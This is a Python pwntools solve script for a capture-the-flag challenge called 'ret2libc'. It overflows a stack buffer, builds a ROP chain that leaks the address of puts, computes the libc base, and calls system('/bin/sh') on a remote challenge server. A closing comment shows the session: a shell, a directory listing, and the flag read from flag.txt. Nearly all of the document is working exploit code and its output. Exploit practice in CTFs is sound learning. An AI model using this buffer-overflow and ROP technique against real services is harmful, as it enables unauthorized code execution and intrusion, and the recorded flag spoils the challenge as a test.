from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './ret2libc'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "107.178.209.165"
  PORT = 1337
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc

pop_rdi_ret = 0x401243 # pop rdi; ret; 
puts_plt    = 0x401060

s.recvuntil("Enter your name\n")

buf  = "A"*40
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(puts_plt)
buf += p64(elf.sym.main)
s.sendline(buf)

s.recvuntil("\n")
puts_addr = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr   =", hex(puts_addr)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)
print "binsh_addr  =", hex(binsh_addr)

s.recvuntil("Enter your name\n")

buf  = "A"*40
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_ret2libc/ret2libc$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_ret2libc/ret2libc/ret2libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 107.178.209.165 on port 1337: Done
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_ret2libc/ret2libc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr   = 0x7fbbb687d970
libc_base   = 0x7fbbb67fd000
system_addr = 0x7fbbb684c420
binsh_addr  = 0x7fbbb69b0d88
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD@
$ id
/bin/sh: 1: id: not found
$ ls -l
total 44
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 bin
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 dev
-rwxr----- 1 0 1000    56 Jun 11 05:49 flag.txt
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib32
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib64
-rwxr-x--- 1 0 1000 16816 Jun 11 05:50 ret2libc
$ cat flag.txt
accessdenied{ret2l1bc_15_r34lly_4m4z1ng_3xpl0_75723a21}
'''
